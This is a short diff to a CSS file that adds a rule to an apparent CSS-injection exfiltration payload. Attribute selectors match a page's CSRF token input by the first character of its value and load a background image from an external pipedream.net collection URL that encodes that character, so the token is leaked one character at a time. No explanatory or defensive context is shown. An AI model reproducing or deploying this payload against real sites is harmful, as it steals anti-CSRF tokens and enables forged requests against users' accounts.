@@ -41,6 +41,10 @@ input[name=csrf][value^=l]{
     background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/l);
 }
 
+input[name=csrf][value^=y]{
+    background-image: url(//eoa21cz1z5v9xqj.m.pipedream.net/y);
+}
+
 
 
 input[name=csrf][value^=csrF] ~ * {
